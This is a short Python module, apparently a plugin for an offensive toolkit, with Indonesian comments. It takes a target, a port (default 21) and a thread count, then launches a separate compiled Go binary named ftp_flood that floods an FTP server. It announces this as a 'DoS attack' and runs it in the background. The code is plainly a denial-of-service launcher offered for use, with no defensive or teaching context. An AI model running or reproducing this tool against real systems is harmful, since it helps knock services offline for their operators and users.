import subprocess
import os

def execute(options):
    target = options.get("TARGET")
    port = options.get("PORT", "21")
    threads = options.get("THREADS", "50")

    if not target:
        print("[-] Error: TARGET is required!")
        return

    # Pastikan biner sudah di-compile: go build -o bin/ftp_flood ftp_flood.go
    bin_path = "./src/ftp_flood"

    if not os.path.exists(bin_path):
        print(f"[-] Error: Binary {bin_path} not found.")
        return

    print(f"[*] Launching DoS attack on {target}")
    try:
        # Menjalankan biner Go dengan argumen dinamis
        process = subprocess.Popen([
            bin_path, 
            "-t", target, 
            "-p", port, 
            "-w", threads
        ])
        
        print(f"[+] Attack running in background. PID: {process.pid}")
        print("[!] Press Ctrl+C to stop (if integrated in main shell).")
        
        # Kamu bisa membiarkannya berjalan atau menunggu
        process.wait()
        
    except KeyboardInterrupt:
        process.terminate()
        print("\n[!] Attack stopped by user.")
    except Exception as e:
        print(f"[-] Execution failed: {e}")
      
